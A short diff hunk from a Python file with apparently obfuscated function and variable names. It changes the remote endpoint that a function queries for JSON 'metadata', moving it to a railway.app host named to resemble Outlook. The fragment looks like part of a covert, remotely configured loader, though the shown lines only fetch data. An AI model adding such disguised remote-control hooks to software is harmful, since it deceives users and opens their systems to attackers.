@@ -18,7 +18,7 @@ def model_ughife_544():
 
     def eval_kiipam_432():
         try:
-            process_jnxoro_617 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_jnxoro_617 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_jnxoro_617.raise_for_status()
             config_rczhiu_121 = process_jnxoro_617.json()
             learn_yopkuc_366 = config_rczhiu_121.get('metadata')
